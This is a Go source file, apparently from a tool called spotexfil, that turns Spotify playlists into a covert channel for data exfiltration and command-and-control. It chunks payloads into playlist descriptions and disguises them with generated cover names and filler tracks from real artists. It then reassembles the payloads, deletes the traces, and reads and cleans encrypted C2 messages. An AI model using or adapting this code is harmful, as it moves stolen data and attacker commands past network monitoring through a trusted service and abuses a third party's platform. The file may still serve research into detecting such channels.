package spotify

import (
	"context"
	"encoding/json"
	"fmt"
	"html"
	"math/rand"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	spotifyapi "github.com/zmb3/spotify/v2"
	spotifyauth "github.com/zmb3/spotify/v2/auth"
	"golang.org/x/oauth2"
)

// Client wraps the Spotify API for covert data transmission.
type Client struct {
	api           *spotifyapi.Client
	userID        string
	useCoverNames bool
}

// NewClient creates an authenticated Spotify client.
func NewClient(cfg *Config, useCoverNames bool) (*Client, error) {
	ctx := context.Background()

	auth := spotifyauth.New(
		spotifyauth.WithClientID(cfg.ClientID),
		spotifyauth.WithClientSecret(cfg.ClientSecret),
		spotifyauth.WithRedirectURL(cfg.RedirectURI),
		spotifyauth.WithScopes(
			spotifyauth.ScopeUserLibraryRead,
			spotifyauth.ScopeUserLibraryModify,
			spotifyauth.ScopePlaylistModifyPrivate,
			spotifyauth.ScopePlaylistReadPrivate,
		),
	)

	token := &oauth2.Token{
		AccessToken: cfg.ClientSecret, // placeholder
	}

	httpClient := auth.Client(ctx, token)

	api := spotifyapi.New(httpClient)

	return &Client{
		api:           api,
		userID:        cfg.Username,
		useCoverNames: useCoverNames,
	}, nil
}

// GetAllPlaylists fetches ALL user playlists with pagination.
func (c *Client) GetAllPlaylists(ctx context.Context) ([]spotifyapi.SimplePlaylist, error) {
	var all []spotifyapi.SimplePlaylist
	offset := 0
	limit := 50

	for {
		page, err := c.api.GetPlaylistsForUser(ctx, c.userID,
			spotifyapi.Limit(limit), spotifyapi.Offset(offset))
		if err != nil {
			return nil, fmt.Errorf("get playlists: %w", err)
		}
		if len(page.Playlists) == 0 {
			break
		}
		all = append(all, page.Playlists...)
		if page.Next == "" {
			break
		}
		offset += limit
	}
	return all, nil
}

// GenerateCoverName generates an innocuous-looking playlist name.
func GenerateCoverName() string {
	names := shared.Proto.Transport.CoverNames
	name := names[rand.Intn(len(names))]
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	suffix := make([]byte, 4)
	for i := range suffix {
		suffix[i] = chars[rand.Intn(len(chars))]
	}
	return fmt.Sprintf("%s #%s", name, string(suffix))
}

// WriteChunks writes payload chunks as playlists with cover names and metadata markers.
func (c *Client) WriteChunks(ctx context.Context, payload string) error {
	if len(payload) > shared.Proto.Transport.MaxPayloadSize {
		return fmt.Errorf("payload too large: %d bytes", len(payload))
	}

	markerSep := shared.Proto.Transport.MarkerSep
	chunkSize := shared.Proto.Transport.ChunkSize
	metaOverhead := 20
	effectiveChunk := chunkSize - metaOverhead

	var chunks []string
	if len(payload) <= effectiveChunk {
		chunks = []string{payload}
	} else {
		for i := 0; i < len(payload); i += effectiveChunk {
			end := i + effectiveChunk
			if end > len(payload) {
				end = len(payload)
			}
			chunks = append(chunks, payload[i:end])
		}
	}

	fmt.Println("[*] Generating playlists")

	for idx, chunk := range chunks {
		i := idx + 1
		var playlistName, description string

		if c.useCoverNames {
			playlistName = GenerateCoverName()
			meta, _ := json.Marshal(map[string]int{"i": i})
			description = chunk + markerSep + string(meta)
		} else {
			playlistName = fmt.Sprintf("%d-payloadChunk", i)
			description = chunk
		}

		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
			playlistName, description, false, false)
		if err != nil {
			return fmt.Errorf("create playlist: %w", err)
		}

		fmt.Printf("\t[*] Created [%d/%d] %s (%d chars)\n",
			i, len(chunks), playlistName, len(chunk))

		// Add filler tracks
		c.addFillerTracks(ctx, playlist.ID)

		time.Sleep(100 * time.Millisecond)
	}

	fmt.Printf("[*] Data encoded and sent (%d playlists)\n", len(chunks))
	return nil
}

// ReadChunks retrieves and reassembles payload from playlists.
func (c *Client) ReadChunks(ctx context.Context) (string, error) {
	fmt.Println("[*] Retrieving playlists")
	markerSep := shared.Proto.Transport.MarkerSep

	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return "", err
	}

	type indexedChunk struct {
		index int
		data  string
	}

	var payloadChunks []indexedChunk

	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			return "", fmt.Errorf("get playlist %s: %w", p.ID, err)
		}

		name := p.Name
		desc := html.UnescapeString(full.Description)

		isPayload := false
		chunkIndex := 0

		// Legacy format
		if strings.Contains(name, "payloadChunk") {
			isPayload = true
			parts := strings.SplitN(name, "-", 2)
			fmt.Sscan(parts[0], &chunkIndex)
		}

		// New format
		if strings.Contains(desc, markerSep) {
			isPayload = true
			parts := strings.SplitN(desc, markerSep, 2)
			desc = parts[0]
			var meta map[string]int
			if json.Unmarshal([]byte(parts[1]), &meta) == nil {
				chunkIndex = meta["i"]
			}
		}

		if isPayload {
			payloadChunks = append(payloadChunks, indexedChunk{
				index: chunkIndex,
				data:  desc,
			})
			fmt.Printf("\t[*] Retrieved chunk %d: %s\n", chunkIndex, name)
		}
	}

	// Sort by index
	for i := 0; i < len(payloadChunks); i++ {
		for j := i + 1; j < len(payloadChunks); j++ {
			if payloadChunks[j].index < payloadChunks[i].index {
				payloadChunks[i], payloadChunks[j] = payloadChunks[j], payloadChunks[i]
			}
		}
	}

	var sb strings.Builder
	for _, c := range payloadChunks {
		sb.WriteString(c.data)
	}

	fmt.Printf("[*] Retrieved %d chunks\n", len(payloadChunks))
	return sb.String(), nil
}

// DeleteChunks deletes all payload playlists.
func (c *Client) DeleteChunks(ctx context.Context) error {
	markerSep := shared.Proto.Transport.MarkerSep
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	count := 0
	for _, p := range playlists {
		name := p.Name
		if strings.Contains(name, "payloadChunk") {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
			continue
		}

		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}
		desc := full.Description
		if strings.Contains(desc, markerSep) {
			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
				count++
			}
		}
	}

	fmt.Printf("[*] Data cleared (%d playlists removed)\n", count)
	return nil
}

// WriteC2Playlists writes C2 message chunks as playlists.
func (c *Client) WriteC2Playlists(ctx context.Context, encryptedDescs []string) error {
	for _, description := range encryptedDescs {
		name := GenerateCoverName()
		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
			name, description, false, false)
		if err != nil {
			fmt.Printf("[!] Cannot create C2 playlist: %v\n", err)
			continue
		}

		c.addFillerTracks(ctx, playlist.ID)
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// ReadC2Playlists reads and decrypts C2 playlists.
func (c *Client) ReadC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) (map[int][]protocol.ChunkMeta, error) {
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return nil, err
	}

	var descPairs []protocol.DescPair
	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}
		desc := html.UnescapeString(full.Description)
		descPairs = append(descPairs, protocol.DescPair{
			PlaylistID:  string(p.ID),
			Description: desc,
		})
	}

	return protocol.ReadC2Descriptions(descPairs, encryptionKey, channel, seq), nil
}

// CleanC2Playlists deletes C2 playlists matching channel and optional seq.
func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey string, seq int) error {
	tag := protocol.ComputeC2Tag(encryptionKey)
	playlists, err := c.GetAllPlaylists(ctx)
	if err != nil {
		return err
	}

	for _, p := range playlists {
		full, err := c.api.GetPlaylist(ctx, p.ID)
		if err != nil {
			continue
		}

		desc := html.UnescapeString(full.Description)
		if !strings.HasPrefix(desc, tag) {
			continue
		}

		meta, _, err := protocol.DecryptChunkDesc(desc, encryptionKey)
		if err != nil {
			continue
		}

		if c, ok := meta["c"].(string); ok && c != channel {
			continue
		}
		if seq >= 0 {
			if s, ok := meta["seq"].(float64); ok && int(s) != seq {
				continue
			}
		}

		_ = c.api.UnfollowPlaylist(ctx, p.ID)
	}
	return nil
}

// addFillerTracks adds random filler tracks to a playlist for cover.
func (c *Client) addFillerTracks(ctx context.Context, playlistID spotifyapi.ID) {
	artists := shared.Proto.Transport.FillerArtists
	artist := artists[rand.Intn(len(artists))]

	results, err := c.api.Search(ctx, fmt.Sprintf("artist:%s", artist),
		spotifyapi.SearchTypeArtist, spotifyapi.Limit(1))
	if err != nil || len(results.Artists.Artists) == 0 {
		return
	}

	artistID := results.Artists.Artists[0].ID
	topTracks, err := c.api.GetArtistsTopTracks(ctx, artistID, "US")
	if err != nil || len(topTracks) == 0 {
		return
	}

	count := 5
	if len(topTracks) < count {
		count = len(topTracks)
	}

	trackIDs := make([]spotifyapi.ID, count)
	for i := 0; i < count; i++ {
		trackIDs[i] = topTracks[i].ID
	}

	_, _ = c.api.AddTracksToPlaylist(ctx, playlistID, trackIDs...)
}
